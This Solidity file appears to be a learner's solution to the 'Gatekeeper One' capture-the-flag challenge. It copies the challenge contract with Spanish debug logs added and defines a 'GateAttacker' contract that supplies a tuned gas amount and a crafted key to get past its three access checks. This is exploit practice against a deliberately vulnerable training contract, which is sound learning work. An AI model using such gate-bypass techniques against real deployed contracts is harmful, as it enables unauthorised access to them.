// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "hardhat/console.sol";

contract GatekeeperConsole {
    using SafeMath for uint256;
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        console.log("PASASTE LA PUERTA 1");
        _;
    }

    modifier gateTwo() {
        console.log("GASLEFT perritoooooo: ", gasleft()); //consume 782 wei
        require(gasleft().mod(8191) == 0);
        console.log("PASASTE LA PUERTA 2");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        console.logBytes8(_gateKey);
        console.log("uint32(uint64(_gateKey)): ", uint32(uint64(_gateKey)));
        console.log("uint16(uint64(_gateKey): ", uint16(uint64(_gateKey)));
        console.log("uint64(_gateKey): ", uint64(_gateKey));
        console.log("uint16(tx.origin): ", uint16(tx.origin));
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(tx.origin),
            "GatekeeperOne: invalid gateThree part three"
        );
        console.log("ENTRASTE CRACK!!!");
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }

    function testenter(bytes8 _gateKey)
        public
        gateThree(_gateKey)
        returns (bool)
    {
        return true;
    }
}
//----------------------------------//

interface IGatekeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GateAttacker {

    IGatekeeperOne public challenge;
    bool funciono;

    constructor(address _gatekeeperone) public {
        challenge = IGatekeeperOne(_gatekeeperone);
    }

    function atacar(bytes8 _gateKey, uint256 _cantidadGas)
        external
        returns (bool)
    {
        console.log("PROBANDO CON CANTIDAD DE GAS: ", _cantidadGas);
        funciono = challenge.enter.gas(_cantidadGas)(_gateKey);
        return funciono;
    }
}
